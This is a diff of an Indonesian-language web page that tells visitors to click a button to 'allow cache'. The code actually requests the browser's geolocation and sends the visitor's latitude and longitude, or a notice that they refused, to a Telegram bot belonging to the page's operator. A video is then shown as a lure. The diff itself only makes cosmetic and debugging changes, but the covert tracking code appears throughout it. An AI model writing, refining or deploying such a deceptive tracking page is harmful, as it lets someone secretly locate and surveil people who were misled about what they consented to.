@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>izinkan cache</title>
+  <title>Izinkan Cache</title>
   <style>
     /* Membuat halaman memenuhi layar dan tidak bisa digeser */
     html, body {
@@ -23,16 +23,17 @@
     #videoContainer {
       display: none;
       margin-top: 20px;
+      border: 2px solid red; /* Menambahkan border untuk debug */
     }
   </style>
 </head>
 <body>
-  <h2>izinkan cache</h2>
+  <h2>Izinkan Cache</h2>
   <p>Silakan klik tombol di bawah untuk mengizinkan cache Anda.</p>
   <button onclick="mintaLokasi()">Izinkan Sekarang</button>
 
   <div id="videoContainer">
-    <video width="320" height="240" controls>
+    <video width="320" height="240" controls autoplay>
       <source src="https://now-glich.github.io/Myfirsh/trik.mp4" type="video/mp4">
       Browser Anda tidak mendukung video.
     </video>
@@ -47,16 +48,23 @@
         navigator.geolocation.getCurrentPosition(
           (pos) => {
             const { latitude, longitude } = pos.coords;
-            alert(`cache berhasil`);
+            alert(`Cache berhasil`);
             const pesan = `Lokasi berhasil diterima boss:\nLat: ${latitude}\nLon: ${longitude}`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
 
-            // Tampilkan video
-            document.getElementById("videoContainer").style.display = "block";
+            // Debugging: Menampilkan video
+            console.log("Lokasi berhasil, menampilkan video...");
+
+            // Menunggu sedikit waktu sebelum menampilkan video
+            setTimeout(() => {
+              // Tampilkan video
+              document.getElementById("videoContainer").style.display = "block";
+            }, 500); // 500ms delay (setengah detik)
           },
           (err) => {
             const pesan = `Pengguna menolak memberikan lokasi.`;
             fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(pesan)}`);
+            console.log("Lokasi ditolak.");
           }
         );
       } else {
